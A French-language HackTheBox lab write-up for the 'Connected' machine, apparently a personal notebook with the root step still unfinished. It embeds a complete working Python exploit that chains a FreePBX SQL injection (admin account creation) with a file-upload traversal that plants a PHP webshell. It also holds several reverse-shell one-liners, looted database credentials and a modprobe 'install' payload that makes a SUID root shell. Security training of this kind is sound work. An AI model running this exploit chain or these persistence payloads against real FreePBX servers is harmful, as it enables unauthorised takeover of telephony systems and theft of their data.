# Connected — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-09-30 |
| **Vecteur** | FreePBX SQLi→upload RCE (asterisk) → **privesc EN COURS** : `/etc/modprobe.d` inscriptible (dahdi) |
| **CVE** | CVE-2025-57819, CVE-2025-61678 |
| **Tags** | freepbx, voip, sqli, file-upload, modprobe, dahdi, cred-reuse |
| **Statut** | 🟡 user OK — root pas encore obtenu (voir "REPRENDRE ICI") |



```bash
┌──(kali㉿kali)-[~/Téléchargements]
└─$ nmap -sC -sV -oA Connectes 10.129.245.100
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 11:07 +0200
Nmap scan report for 10.129.245.100
Host is up (0.024s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
58080/tcp filtered unknown


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.59 seconds
```


| Port | Service | Version | Piste |
| --- | --- | --- | --- |
| 22 | SSH | OpenSSH 7.4 | |
| 80 | HTTP | Apache httpd 2.4.6 | |
| 443 | HTTPS | Apache httpd 2.4.6 | |


FreePBX 16.0.40.7
CVE-2025-57819
https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   FreePBX 16 unauthenticated SQLi -> admin -> authenticated file-upload RCE
#   Chains:
#     CVE-2025-57819  unauth stacked SQL injection (endpoint module loader, 'brand' param)
#     CVE-2025-61678  authenticated arbitrary file upload (endpoint 'upload_cust_fw', fwbrand traversal)
#
#   Flow:
#     1. Inject a brand-new FreePBX admin straight into the `ampusers` table via stacked SQLi (no auth).
#     2. Log into the FreePBX admin panel as that user.
#     3. Abuse the Endpoint Manager firmware uploader to drop a PHP webshell into the web root.
#     4. Run a single command (--command) or pop an interactive reverse shell (--lhost/--lport).
#
import argparse
import hashlib
import random
import string
import sys
import threading
import time

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[-] pip install requests")

BANNER = r"""
 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb
"""

# ---- pretty logging ------------------------------------------------------
def log(tag, msg, c=""):
    cols = {"+": "\033[92m", "-": "\033[91m", "*": "\033[94m", "!": "\033[93m"}
    r = "\033[0m"
    print(f"{cols.get(tag, '')}[{tag}]{r} {msg}")

def hx(s):
    """encode a python str/bytes as a MySQL 0x... hex literal (quote-free)."""
    if isinstance(s, str):
        s = s.encode()
    return "0x" + s.hex()

def rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class FreePBXExploit:
    def __init__(self, rhost, rport, ssl=True, timeout=30):
        scheme = "https" if ssl else "http"
        # omit the port when it's the default, otherwise FreePBX's Referer host check
        # (host vs host:port) rejects the upload with "ajaxRequest declined - Referrer"
        if (ssl and rport == 443) or (not ssl and rport == 80):
            self.base = f"{scheme}://{rhost}"
        else:
            self.base = f"{scheme}://{rhost}:{rport}"
        self.host = rhost
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": "Mozilla/5.0"})
        self.user = "svc_" + rnd(5)
        self.password = rnd(12)
        self.shell_dir = rnd(10)
        self.shell_name = rnd(8) + ".php"

    # ---- step 1: CVE-2025-57819 stacked SQLi -> create admin -------------
    def _sqli(self, payload):
        """Send a stacked-query payload through the unauth endpoint loader."""
        params = {
            "module": r"FreePBX\modules\endpoint\ajax",
            "command": "model",
            "template": "x",
            "model": "model",
            "brand": payload,
        }
        return self.s.get(f"{self.base}/admin/ajax.php", params=params, timeout=self.timeout)

    def create_admin(self):
        log("*", f"[CVE-2025-57819] creating admin via stacked SQLi: {self.user}:{self.password}")
        sha1 = hashlib.sha1(self.password.encode()).hexdigest()
        # idempotent: drop any leftover, then insert with full ('*') section access
        self._sqli(f"x'; DELETE FROM asterisk.ampusers WHERE username={hx(self.user)}-- -")
        self._sqli(
            "x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections) "
            f"VALUES ({hx(self.user)},{hx(sha1)},0x2a)-- -"
        )
        log("+", "admin row inserted into ampusers")

    # ---- step 2: authenticate ------------------------------------------
    def login(self):
        log("*", "logging into FreePBX admin panel")
        self.s.get(f"{self.base}/admin/config.php", timeout=self.timeout)
        r = self.s.post(
            f"{self.base}/admin/config.php",
            data={"username": self.user, "password": self.password},
            timeout=self.timeout,
        )
        if "Logout" in r.text or "Dashboard" in r.text or "nav-tabs" in r.text:
            log("+", "authenticated as " + self.user)
            return True
        # fall back: hit the dashboard to confirm a live session
        r = self.s.get(f"{self.base}/admin/config.php", timeout=self.timeout)
        if "Logout" in r.text:
            log("+", "authenticated as " + self.user)
            return True
        log("-", "login failed")
        return False

    # ---- step 3: CVE-2025-61678 file-upload -> webshell -----------------
    def upload_shell(self):
        log("*", f"[CVE-2025-61678] uploading webshell -> /{self.shell_dir}/{self.shell_name}")
        webshell = b'<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>'
        files = {
            "dzuuid": (None, "48069f49-c03e-4182-81f7-48e36622e0d3"),
            "dzchunkindex": (None, "0"),
            "dztotalfilesize": (None, str(len(webshell))),
            "dzchunksize": (None, "2000000"),
            "dztotalchunkcount": (None, "1"),
            "dzchunkbyteoffset": (None, "0"),
            # traversal out of /tftpboot/customfw/ into the web root; new dir so mkdir() succeeds
            "fwbrand": (None, f"../../../var/www/html/{self.shell_dir}"),
            "fwmodel": (None, "1"),
            "fwversion": (None, "1"),
            "file": (self.shell_name, webshell, "application/x-php"),
        }
        headers = {
            "Referer": f"{self.base}/admin/config.php?display=epm_advanced",
            "X-Requested-With": "XMLHttpRequest",
        }
        # the handler throws a non-fatal unlink/mkdir warning AFTER writing the file -> ignore status
        self.s.post(
            f"{self.base}/admin/ajax.php?module=endpoint&command=upload_cust_fw",
            files=files, headers=headers, timeout=self.timeout,
        )
        self.shell_url = f"{self.base}/{self.shell_dir}/{self.shell_name}"
        if self.run_cmd("echo EHXB_$((1+1))").strip().endswith("EHXB_2"):
            log("+", f"webshell live: {self.shell_url}")
            return True
        log("-", "webshell not reachable")
        return False

    # ---- step 4a: single command ---------------------------------------
    def run_cmd(self, cmd):
        try:
            r = self.s.get(self.shell_url, params={"cmd": cmd}, timeout=self.timeout)
            return r.text.replace("<pre>", "").replace("</pre>", "")
        except Exception:
            return ""

    # ---- step 4b: interactive reverse shell ----------------------------
    def reverse_shell(self, lhost, lport):
        payloads = [
            f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
            f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")\'',
        ]
        log("*", f"firing reverse shell -> {lhost}:{lport}")
        for p in payloads:
            threading.Thread(target=self.run_cmd, args=(p,), daemon=True).start()
            time.sleep(0.5)


def main():
    print(BANNER)
    ap = argparse.ArgumentParser(
        description="FreePBX 16 unauth SQLi -> admin -> RCE (CVE-2025-57819 + CVE-2025-61678)")
    ap.add_argument("--rhost", required=True, help="target host (e.g. pbx.example.com)")
    ap.add_argument("--rport", type=int, default=443, help="target port (default 443)")
    ap.add_argument("--http", action="store_true", help="use plain HTTP instead of HTTPS")
    ap.add_argument("--lhost", help="attacker IP for reverse shell")
    ap.add_argument("--lport", type=int, help="attacker port for reverse shell")
    ap.add_argument("--command", help="run a single command instead of a reverse shell")
    args = ap.parse_args()

    x = FreePBXExploit(args.rhost, args.rport, ssl=not args.http)

    x.create_admin()
    if not x.login():
        sys.exit(1)
    if not x.upload_shell():
        sys.exit(1)

    # mode: single command
    if args.command:
        log("*", f"executing: {args.command}")
        print(x.run_cmd(args.command))
        return

    # mode: reverse shell (auto-listener via pwntools if available)
    if args.lhost and args.lport:
        try:
            from pwn import listen
            l = listen(args.lport)
            time.sleep(1)
            x.reverse_shell(args.lhost, args.lport)
            l.wait_for_connection()
            log("+", "shell incoming! dropping to interactive")
            l.interactive()
        except ImportError:
            log("!", "pwntools not found - start your own listener:")
            log("!", f"    nc -lvnp {args.lport}")
            input("[*] press ENTER once your listener is ready...")
            x.reverse_shell(args.lhost, args.lport)
            log("*", "payload sent, check your listener")
        return

    # default: confirm RCE
    log("+", "RCE confirmed as: " + x.run_cmd("id").strip())
    log("!", "use --command '<cmd>' or --lhost/--lport for a shell")


if __name__ == "__main__":
    main()
```

```bash
python3 vuln.py --rhost 10.129.245.100 --command "bash -i >& /dev/tcp/10.10.14.236/4444 0>&1"
```

```bash
nc -lvnp 4444

[asterisk@connected asterisk]$ whoami
whoami
asterisk

# Kali : sers le binaire depuis le bon dossier
cd ~/Téléchargements
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
python3 -m http.server 8000

# cible
cd /tmp && curl http://10.10.14.236:8000/pspy64 -o pspy64
ls -la pspy64          # vérifie la taille (~3-4 Mo, PAS 460 o !)
chmod +x pspy64 && ./pspy64

UID=0  PID=1388  /usr/bin/python3.6 -m aiohttp.web aiovega.web:app_factory -H 127.0.0.1 -P 4000

find / -iname '*aiovega*' 2>/dev/null
find / -path '*aiovega*' -name '*.py' 2>/dev/null
python -c "import aiovega, os; print(os.path.dirname(aiovega.__file__))" 2>/dev/null                     
/usr/lib/python3.6/site-packages/aiovega/cli/__init__.py
/usr/lib/python3.6/site-packages/aiovega/cli/repl.py
/usr/lib/python3.6/site-packages/aiovega/filetransfer/__init__.py
/usr/lib/python3.6/site-packages/aiovega/filetransfer/http.py
/usr/lib/python3.6/site-packages/aiovega/filetransfer/tftp.py
/usr/lib/python3.6/site-packages/aiovega/web/__init__.py
/usr/lib/python3.6/site-packages/aiovega/web/config.py
/usr/lib/python3.6/site-packages/aiovega/web/shell.py
/usr/lib/python3.6/site-packages/aiovega/web/system.py
/usr/lib/python3.6/site-packages/aiovega/__init__.py
/usr/lib/python3.6/site-packages/aiovega/config.py
/usr/lib/python3.6/site-packages/aiovega/exceptions.py
/usr/lib/python3.6/site-packages/aiovega/firmware.py
/usr/lib/python3.6/site-packages/aiovega/parser.py
/usr/lib/python3.6/site-packages/aiovega/path.py
/usr/lib/python3.6/site-packages/aiovega/serialize.py
/usr/lib/python3.6/site-packages/aiovega/shell.py
<ovega, os; print(os.path.dirname(aiovega.__file__))" 2>/dev/null  

```

cat /usr/lib/python3.6/site-packages/aiovega/web/__init__.py
cat /usr/lib/python3.6/site-packages/aiovega/web/shell.py
cat /usr/lib/python3.6/site-packages/aiovega/web/system.py
cat /usr/lib/python3.6/site-packages/aiovega/web/config.py

---

# Privilege escalation (asterisk → root)

## Contexte / durcissement
Box volontairement durcie. Tous les vecteurs "faciles" fermés :

| Vecteur testé | Résultat |
| --- | --- |
| `staprun` SUID | ❌ pas de `stap` installé + exécution réservée au groupe `stapusr` (asterisk n'y est pas) |
| `pkexec` PwnKit (CVE-2021-4034) | ❌ patché — `polkit-0.112-26.el7_9.1` |
| sudo Baron Samedit (CVE-2021-3156) | ❌ patché — `sudo-1.8.23-10.el7_9.1` |
| noyau (`5.4.239-1.el7.elrepo`) | ❌ trop récent (DirtyCow/DirtyPipe hors scope) ; suggestions linux-exploit-suggester peu fiables, dont des CVE-2026-* au format suspect (leurres probables) |
| `sudo -l` | ❌ demande le mot de passe d'asterisk (inconnu) |

Note : auditd + **laurel** actifs (`/var/log/laurel`) → la box journalise tout (OPSEC).

## Loot d'identifiants (piste creds abandonnée)
```bash
# AMI secret
cat /etc/asterisk/manager.conf      # user wnPa2WbXJ/ED : secret = fe1mYBs7D5P3
# DB creds (freepbxuser fonctionne : erreur 1054 = connecté, pas 1045)
cat /etc/freepbx.conf               # freepbxuser : mZzDpAGKTmPJ  (db 'asterisk')

mysql -u freepbxuser -p'mZzDpAGKTmPJ' asterisk -e 'select username,password_sha1 from ampusers;'
# admin + 6 comptes svc_* (SHA1)
# admin  : 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a
# svc_2z99f e7... etc.
```
➡️ **Rabbit hole** : `grep svc /etc/passwd` = vide → les `svc_*` ne sont PAS des comptes système.
Hashcat `-m 100` + rockyou = **rien cassé** (mots de passe aléatoires). Piste creds/reuse morte.

## aiovega — bridge REST root sur 127.0.0.1:4000 (rabbit hole confirmé)
`UID=0 python3.6 -m aiohttp.web aiovega.web:app_factory -H 127.0.0.1 -P 4000`
- Toutes les routes (`/v1/shell/run`, `/v1/system/save`, `/v1/config...`) passent par le middleware `vega_proxy` → exigent un header `X-Vega-Connection: <url>` et se **connectent en sortie** (telnet/ssh/serial) vers le Vega qu'ON désigne.
- `shell.run` exécute la commande **sur le Vega distant**, pas en local.
- Parseurs `serialize.load` / `path.getter` = pyparsing + traversée de dict → **pas d'eval/pickle/getattr**, aucune injection locale.
- Paquet `/usr/lib/python3.6/site-packages/aiovega/` = `root:root`, **non inscriptible**.
➡️ Utile seulement comme **SSRF-as-root** (connexion sortante root vers une URL choisie). Pas de RCE/écriture locale. **Abandonné pour le root local.**
- `pnp_server` (`/usr/local/bin/pnp_server`, UID 999) = serveur PnP Sangoma standard, aucun vecteur.

## ✅ LE VECTEUR RETENU : `/etc/modprobe.d` + `/etc/dahdi` inscriptibles
```bash
find / -writable -type f 2>/dev/null | grep -vE '/(proc|sys|run|tmp)'
# -> /etc/modprobe.d/dahdi.conf         (asterisk:asterisk)
# -> /etc/dahdi/  (tout le dossier)     (asterisk:asterisk)  dont modules, system.conf
lsmod | grep dahdi        # VIDE -> dahdi non chargé
```
Principe : quand un process **root** (re)démarre DAHDI, l'init lit `/etc/dahdi/modules` et fait
`modprobe <module>` → `modprobe` lit `/etc/modprobe.d/*.conf` → toute directive **`install` s'exécute en root**.

### Charge posée (persiste dans /etc, survit à un reboot mais pas à un revert VM)
```bash
printf '\ninstall dahdi /bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /sbin/modprobe --ignore-install dahdi"\n' >> /etc/modprobe.d/dahdi.conf
# renfort via /etc/dahdi/modules (qu'on possède) :
echo 'pwnmod' >> /etc/dahdi/modules
printf 'install pwnmod /bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"\n' >> /etc/modprobe.d/dahdi.conf
```

## ⏭️ REPRENDRE ICI (au retour sur la machine)
Le seul maillon manquant = **le déclencheur du `modprobe dahdi` en root**. pspy (fenêtre longue) n'a
montré AUCUN job root dahdi/modprobe — mais `anacron -s` rattrapait cron.daily → la box **a rebooté
vers 13:40**, donc elle redémarre probablement sur planning.

1. **Confirmer le trigger de boot** :
   ```bash
   systemctl is-enabled dahdi 2>/dev/null
   systemctl cat dahdi 2>/dev/null | head -30    # ExecStart lance-t-il modprobe / dahdi_cfg ?
   cat /etc/dahdi/modules
   uptime                                         # cadence de reboot
   ```
2. Si `dahdi` est **enabled** et touche dahdi au boot → **réarmer la charge** (vérifier qu'elle est
   toujours là après un éventuel revert), puis **attendre le prochain reboot** et :
   ```bash
   ls -la /tmp/rootbash        # bit s présent = la charge a fire
   /tmp/rootbash -p ; id       # euid=0 -> root
   ```
3. Si pas de service `dahdi` : regarder **`wanpipe`/`wanrouter`** (mêmes `.c`/Makefile inscriptibles
   dans `/etc/wanpipe/api/`, même logique modprobe), ou chercher comment **forcer** un chargement de
   module en root (autoload déclenchable, service invocable).

### Rappels rapides
- Reverse shell asterisk : `python3 vuln.py --rhost <IP> --command "bash -i >& /dev/tcp/10.10.14.236/4444 0>&1"` puis `nc -lvnp 4444`
- Stabiliser TTY : `script -qc /bin/bash /dev/null` (python3 absent ; python2 dispo)
- Creds box : `freepbxuser:mZzDpAGKTmPJ` (DB) — AMI `fe1mYBs7D5P3`